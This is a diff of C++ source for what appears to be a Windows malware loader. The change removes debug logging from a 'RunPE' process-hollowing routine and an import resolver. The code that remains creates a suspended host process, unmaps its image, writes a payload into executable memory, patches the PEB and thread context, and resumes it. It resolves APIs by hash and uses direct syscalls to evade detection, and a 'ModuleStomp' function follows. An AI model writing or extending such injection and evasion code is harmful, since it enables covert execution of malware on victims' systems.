@@ -14,53 +14,6 @@
 #include <winternl.h>
 
 namespace {
-    // IAT-based file debug log — same as Entry.cpp DbgLog
-    extern "C" __declspec(dllimport) void __stdcall OutputDebugStringA(const char*);
-    extern "C" __declspec(dllimport) HANDLE __stdcall CreateFileA(const char*,DWORD,DWORD,void*,DWORD,DWORD,HANDLE);
-    extern "C" __declspec(dllimport) BOOL __stdcall WriteFile(HANDLE,const void*,DWORD,DWORD*,void*);
-    extern "C" __declspec(dllimport) BOOL __stdcall CloseHandle(HANDLE);
-    extern "C" __declspec(dllimport) LONG __stdcall SetFilePointer(HANDLE,LONG,LONG*,DWORD);
-
-    static const char* RLOG = "C:\\temp\\xen_debug.log";
-
-    __forceinline void RLog(const char* msg) {
-        OutputDebugStringA(msg);
-        HANDLE h = CreateFileA(RLOG, 0x40000000, 0x01, NULL, 4, 0x80, NULL);
-        if (h == (HANDLE)(LONG_PTR)-1) return;
-        SetFilePointer(h, 0, NULL, 2);
-        DWORD len = 0; while (msg[len]) len++;
-        DWORD wr = 0; WriteFile(h, msg, len, &wr, NULL);
-        WriteFile(h, "\r\n", 2, &wr, NULL); CloseHandle(h);
-    }
-
-    __forceinline void RLogHex(const char* prefix, unsigned long val) {
-        char buf[128]; int p = 0;
-        while (prefix[p] && p < 80) { buf[p] = prefix[p]; p++; }
-        buf[p++] = '0'; buf[p++] = 'x';
-        const char* hx = "0123456789ABCDEF";
-        buf[p++] = hx[(val>>28)&0xF]; buf[p++] = hx[(val>>24)&0xF];
-        buf[p++] = hx[(val>>20)&0xF]; buf[p++] = hx[(val>>16)&0xF];
-        buf[p++] = hx[(val>>12)&0xF]; buf[p++] = hx[(val>>8)&0xF];
-        buf[p++] = hx[(val>>4)&0xF];  buf[p++] = hx[val&0xF];
-        buf[p] = 0; RLog(buf);
-    }
-
-    __forceinline void RLogHex64(const char* prefix, unsigned long long val) {
-        char buf[160]; int p = 0;
-        while (prefix[p] && p < 80) { buf[p] = prefix[p]; p++; }
-        buf[p++] = '0'; buf[p++] = 'x';
-        const char* hx = "0123456789ABCDEF";
-        buf[p++] = hx[(val>>60)&0xF]; buf[p++] = hx[(val>>56)&0xF];
-        buf[p++] = hx[(val>>52)&0xF]; buf[p++] = hx[(val>>48)&0xF];
-        buf[p++] = hx[(val>>44)&0xF]; buf[p++] = hx[(val>>40)&0xF];
-        buf[p++] = hx[(val>>36)&0xF]; buf[p++] = hx[(val>>32)&0xF];
-        buf[p++] = hx[(val>>28)&0xF]; buf[p++] = hx[(val>>24)&0xF];
-        buf[p++] = hx[(val>>20)&0xF]; buf[p++] = hx[(val>>16)&0xF];
-        buf[p++] = hx[(val>>12)&0xF]; buf[p++] = hx[(val>>8)&0xF];
-        buf[p++] = hx[(val>>4)&0xF];  buf[p++] = hx[val&0xF];
-        buf[p] = 0; RLog(buf);
-    }
-
     // ── API Set Schema (V6, Windows 10+) ──
     // Used to resolve api-ms-win-* DLL names to their real implementation DLLs.
 
@@ -304,13 +257,11 @@ namespace {
 
         IMAGE_DATA_DIRECTORY& importDir =
             nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
-        if (importDir.VirtualAddress == 0) {
-            RLog("ResolveImports: no imports");
+        if (importDir.VirtualAddress == 0)
             return true;
-        }
 
         HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
-        if (!hK32) { RLog("ResolveImports: k32 not found"); return false; }
+        if (!hK32) return false;
 
         auto fnLoadLibraryA = (HMODULE(WINAPI*)(LPCSTR))
             Api::GetProcByHashCrc(hK32, Api::CrcFn::LoadLibraryA);
@@ -319,10 +270,8 @@ namespace {
         auto fnGetModuleHandleA = (HMODULE(WINAPI*)(LPCSTR))
             Api::GetProcByHashCrc(hK32, Api::CrcFn::GetModuleHandleA);
 
-        if (!fnLoadLibraryA || !fnGetProcAddress) {
-            RLog("ResolveImports: resolver APIs not found");
+        if (!fnLoadLibraryA || !fnGetProcAddress)
             return false;
-        }
 
         PIMAGE_IMPORT_DESCRIPTOR imp =
             (PIMAGE_IMPORT_DESCRIPTOR)(mappedPE + importDir.VirtualAddress);
@@ -344,7 +293,6 @@ namespace {
             HMODULE hDll = fnGetModuleHandleA ? fnGetModuleHandleA(realName) : NULL;
             if (!hDll) hDll = fnLoadLibraryA(realName);
             if (!hDll) {
-                RLog("ResolveImports: DLL load failed");
                 if (apiSetBuf) HeapFree(GetProcessHeap(), 0, apiSetBuf);
                 failCount++;
                 continue;
@@ -386,9 +334,6 @@ namespace {
             if (apiSetBuf) HeapFree(GetProcessHeap(), 0, apiSetBuf);
         }
 
-        RLogHex("ResolveImports: DLLs=", dllCount);
-        RLogHex("ResolveImports: funcs=", funcCount);
-        if (failCount > 0) RLogHex("ResolveImports: failures=", failCount);
         return funcCount > 0;
     }
 }
@@ -524,14 +469,13 @@ namespace GodMode
 
         void RunPE(void* payload, size_t size, unsigned char hostIdx)
         {
-            RLog("RunPE: entry");
             HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
-            if (!hK32) { RLog("RunPE: kernel32 not found"); return; }
+            if (!hK32) return;
 
             auto pCPW = (BOOL(WINAPI*)(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION))
                 Api::GetProcByHashCrc(hK32, Api::CrcFn::CreateProcessW);
             auto pTP  = (BOOL(WINAPI*)(HANDLE,UINT))Api::GetProcByHashCrc(hK32, Api::CrcFn::TerminateProcess);
-            if (!pCPW || !pTP) { RLog("RunPE: CreateProcessW/TerminateProcess not found"); return; }
+            if (!pCPW || !pTP) return;
 
             STARTUPINFOW si = { sizeof(si) };
             PROCESS_INFORMATION pi = { 0 };
@@ -541,16 +485,11 @@ namespace GodMode
 
             if (!pCPW(target, NULL, NULL, NULL, FALSE,
                 CREATE_SUSPENDED, NULL, NULL, &si, &pi))
-            {
-                RLog("RunPE: CreateProcessW FAILED");
                 return;
-            }
-            RLogHex("RunPE: host process created, PID=", pi.dwProcessId);
 
             PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
             if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
             {
-                RLog("RunPE: payload DOS signature INVALID");
                 pTP(pi.hProcess, 0); Syscall::NtClose(pi.hProcess); Syscall::NtClose(pi.hThread);
                 return;
             }
@@ -558,36 +497,24 @@ namespace GodMode
             PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)payload + dosHeader->e_lfanew);
             if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
             {
-                RLog("RunPE: payload PE signature INVALID");
                 pTP(pi.hProcess, 0); Syscall::NtClose(pi.hProcess); Syscall::NtClose(pi.hThread);
                 return;
             }
-            RLogHex64("RunPE: payload ImageBase=", ntHeaders->OptionalHeader.ImageBase);
-            RLogHex("RunPE: payload SizeOfImage=", ntHeaders->OptionalHeader.SizeOfImage);
-            RLogHex("RunPE: payload EntryPoint=", ntHeaders->OptionalHeader.AddressOfEntryPoint);
 
             BYTE* mappedPE = MapPELocally(payload, size);
             if (!mappedPE)
             {
-                RLog("RunPE: MapPELocally FAILED");
                 pTP(pi.hProcess, 0); Syscall::NtClose(pi.hProcess); Syscall::NtClose(pi.hThread);
                 return;
             }
-            RLog("RunPE: PE mapped locally OK");
 
             ntHeaders = (PIMAGE_NT_HEADERS)(mappedPE + dosHeader->e_lfanew);
             StripManifest(mappedPE);
-            RLog("RunPE: StripManifest done");
 
             CONTEXT ctx;
             ctx.ContextFlags = CONTEXT_FULL;
             NTSTATUS ctxSt = Syscall::NtGetContextThread(pi.hThread, &ctx);
-            RLogHex("RunPE: NtGetContextThread status=", (unsigned long)ctxSt);
-            RLogHex64("RunPE: thread Rip=", ctx.Rip);
-            RLogHex64("RunPE: thread Rcx=", ctx.Rcx);
-            RLogHex64("RunPE: PEB ptr(Rdx)=", ctx.Rdx);
             if (ctxSt != 0) {
-                RLog("RunPE: NtGetContextThread FAILED, cannot continue");
                 HeapFree(GetProcessHeap(), 0, mappedPE);
                 pTP(pi.hProcess, 0); Syscall::NtClose(pi.hProcess); Syscall::NtClose(pi.hThread);
                 return;
@@ -599,28 +526,20 @@ namespace GodMode
 #else
             Syscall::NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08), &imageBase, sizeof(PVOID), NULL);
 #endif
-            RLogHex64("RunPE: PEB ImageBase=", (unsigned long long)(ULONG_PTR)imageBase);
 
-            NTSTATUS unmapStatus = Syscall::NtUnmapViewOfSection(pi.hProcess, imageBase);
-            RLogHex("RunPE: NtUnmapViewOfSection status=", (unsigned long)unmapStatus);
+            Syscall::NtUnmapViewOfSection(pi.hProcess, imageBase);
 
             SIZE_T regionSize = ntHeaders->OptionalHeader.SizeOfImage;
 
-            // Try allocation in priority order:
-            // 1. Payload's preferred ImageBase (avoids relocation)
-            // 2. Host's freed ImageBase
-            // 3. Any address (NULL)
             PVOID remoteMem = (PVOID)ntHeaders->OptionalHeader.ImageBase;
             NTSTATUS status = Syscall::NtAllocateVirtualMemory(pi.hProcess, &remoteMem, &regionSize,
                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-            RLogHex("RunPE: NtAllocateVirtualMemory(at payload base) status=", (unsigned long)status);
 
             if (status != 0)
             {
                 remoteMem = imageBase;
                 status = Syscall::NtAllocateVirtualMemory(pi.hProcess, &remoteMem, &regionSize,
                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-                RLogHex("RunPE: NtAllocateVirtualMemory(at host base) status=", (unsigned long)status);
             }
 
             if (status != 0)
@@ -628,32 +547,17 @@ namespace GodMode
                 remoteMem = NULL;
                 status = Syscall::NtAllocateVirtualMemory(pi.hProcess, &remoteMem, &regionSize,
                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-                RLogHex("RunPE: NtAllocateVirtualMemory(at NULL) status=", (unsigned long)status);
             }
 
             if (status != 0)
             {
-                RLog("RunPE: ALL NtAllocateVirtualMemory attempts FAILED");
                 HeapFree(GetProcessHeap(), 0, mappedPE);
                 pTP(pi.hProcess, 0); Syscall::NtClose(pi.hProcess); Syscall::NtClose(pi.hThread);
                 return;
             }
-            RLogHex64("RunPE: allocated at=", (unsigned long long)(ULONG_PTR)remoteMem);
-
-            // Write the mapped PE image to the remote process.
-            // The ntdll loader will process imports, apply relocations,
-            // set section protections, and call the entry point when
-            // we resume the thread. We must NOT resolve imports ourselves
-            // because DLLs (kernel32, user32, etc.) are NOT yet loaded
-            // in the CREATE_SUSPENDED host process — only ntdll is.
-            // We must NOT apply section protections because the loader
-            // needs the IAT writable to resolve imports.
-            // We must NOT zero the import/reloc directories because
-            // the loader needs them to do its job.
 
             Syscall::NtWriteVirtualMemory(pi.hProcess, remoteMem, mappedPE,
                 ntHeaders->OptionalHeader.SizeOfImage, NULL);
-            RLog("RunPE: PE written to remote process");
 
 #if defined(_WIN64)
             Syscall::NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
@@ -662,7 +566,6 @@ namespace GodMode
             Syscall::NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08),
                 &remoteMem, sizeof(PVOID), NULL);
 #endif
-            RLog("RunPE: PEB ImageBase updated");
 
 #if defined(_WIN64)
             ULONG_PTR entryAddr = (ULONG_PTR)remoteMem + ntHeaders->OptionalHeader.AddressOfEntryPoint;
@@ -670,7 +573,6 @@ namespace GodMode
 #else
             ctx.Eax = (DWORD)((ULONG_PTR)remoteMem + ntHeaders->OptionalHeader.AddressOfEntryPoint);
 #endif
-            RLogHex64("RunPE: entryAddr=", (unsigned long long)entryAddr);
 
             {
                 PVOID pebAddr = (PVOID)ctx.Rdx;
@@ -705,7 +607,6 @@ namespace GodMode
                     }
                 }
             }
-            RLog("RunPE: LDR DllBase/EntryPoint/SizeOfImage updated");
 
             {
                 PVOID pebAddr = (PVOID)ctx.Rdx;
@@ -746,35 +647,19 @@ namespace GodMode
                     }
                 }
             }
-            RLog("RunPE: ProcessParameters updated");
 
-            NTSTATUS setCtxSt = Syscall::NtSetContextThread(pi.hThread, &ctx);
-            RLogHex("RunPE: NtSetContextThread status=", (unsigned long)setCtxSt);
-            RLogHex64("RunPE: after setctx Rip=", ctx.Rip);
-            RLogHex64("RunPE: after setctx Rcx=", ctx.Rcx);
-
-            NTSTATUS resumeSt = Syscall::NtResumeThread(pi.hThread, NULL);
-            RLogHex("RunPE: NtResumeThread status=", (unsigned long)resumeSt);
+            Syscall::NtSetContextThread(pi.hThread, &ctx);
+            Syscall::NtResumeThread(pi.hThread, NULL);
 
             {
                 auto pWFSO2 = (DWORD(WINAPI*)(HANDLE,DWORD))
                     Api::GetProcByHashCrc(hK32, Api::CrcFn::WaitForSingleObject);
-                if (pWFSO2) {
-                    DWORD waitResult = pWFSO2(pi.hProcess, 5000);
-                    RLogHex("RunPE: WaitForSingleObject result=", waitResult);
-                    DWORD exitCode = 0;
-                    auto pGEC = (BOOL(WINAPI*)(HANDLE,LPDWORD))
-                        Api::GetProcByHashCrc(hK32, Crc32C::ConstHash("GetExitCodeProcess"));
-                    if (pGEC && pGEC(pi.hProcess, &exitCode)) {
-                        RLogHex("RunPE: exitCode=", exitCode);
-                    }
-                }
+                if (pWFSO2) pWFSO2(pi.hProcess, 5000);
             }
 
             Syscall::NtClose(pi.hProcess);
             Syscall::NtClose(pi.hThread);
             HeapFree(GetProcessHeap(), 0, mappedPE);
-            RLog("RunPE: cleanup done, returning");
         }
 
         void ModuleStomp(void* payload, size_t size)
